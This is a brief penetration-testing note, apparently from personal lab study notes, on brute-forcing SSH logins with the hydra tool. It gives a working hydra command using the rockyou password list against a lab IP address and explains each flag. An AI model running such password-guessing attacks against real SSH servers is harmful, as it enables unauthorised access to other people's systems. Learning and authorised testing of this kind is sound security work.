# Bruteforcing SSH

An incredibly commonly exposed endpoint, insecure #SSH can easily provide a foothold into the network. #bruteforce is a common attack against ssh endpoints. 

## Tools
#hydra is a very useful online bruteforcing tool with extensive customization. 


## How to ...
### Hydra
Example usage:
`hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.146.120 ssh`
Break down:
- `-t` num of parallel connections to target
- `-l` the user who's account you're trying to compromise
- `-P` path to list wordlist of passwords
- `-vV` verbosity setting
- `10.10.146.120` target IP
- `ssh` protocol to attack

